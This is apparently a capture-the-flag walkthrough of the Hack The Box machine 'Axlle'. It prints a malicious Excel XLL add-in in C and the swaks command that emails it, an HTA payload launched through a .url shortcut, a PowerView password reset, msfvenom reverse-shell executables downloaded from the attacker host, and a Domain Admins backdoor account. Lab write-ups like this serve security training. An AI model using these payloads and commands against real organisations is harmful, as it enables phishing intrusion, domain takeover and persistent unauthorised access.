---
title: HTB-Axlle
draft: false
tags:
  - htb
  - windows
  - active-directory
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/Axlle.png)

## Information Gathering
### Rustscan

`rustscan --addresses 10.10.11.21 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image.png)


## Enumeration
### HTTP - TCP 80
axlle.htb /etc/hosts

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-1.png)

> If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture.

## Shell as gideon.hamill
### XLL Exec

https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec


```c
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
    WinExec("powershell -e <snipped>pAA==", 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-3.png)

`x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll exploit.c -luser32`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-4.png)


`swaks --to accounts@axlle.htb --from root@test.htb --body "Shell" --header "Subject: Help me Breach the System" --attach @shell.xll`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-5.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-2.png)

## Privesc: gideon to dallon

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-6.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-7.png)

### HTA

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example


```hta 
<html>
<head>
<HTA:APPLICATION ID="shell">
<script language="javascript">
        var c = "powershell -e <snipped>pAA==";  
        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

```
$url = "file://10.10.14.36/share/shell.hta"
$shortcutPath = "C:\inetpub\testing\shell.url"
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
Set-Content -Path $shortcutPath -Value $shortcutContent
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-9.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-8.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-10.png)


## Privesc: dallon to jacob
### Bloodhound

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-11.png)


`impacket-smbserver share $(pwd) -smb2support`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-12.png)

```
net use * \\10.10.14.23\share
copy 20240626183912_BloodHound.zip Z:
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-13.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-14.png)

### ForceChangePassword

> The members of the group WEB DEVS@AXLLE.HTB have the capability to change the user JACOB.GREENY@AXLLE.HTB's password without knowing that user's current password.

`copy \\10.10.14.23\share\PowerView.ps1`

```
$pass = ConvertTo-SecureString 'SuperSecuredPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity Jacob.Greeny -AccountPassword $pass
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-15.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-16.png)

## Privesc: jacob to administrator

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-17.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-18.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-19.png)

`icacls standalonerunner.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-20.png)

`msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe  LHOST=10.10.14.23 LPORT=9001 -o rev.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-21.png)

`wget http://10.10.14.23:1234/rev.exe -o standalonerunner.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-22.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-23.png)

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=9001 -f exe -o rev.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-25.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-24.png)

## Persistence

```
net user hacker P@ssw0rd! /add
net group "Domain Admins" /add hacker
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-26.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/axlle/image-27.png)

## References
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#hta-example
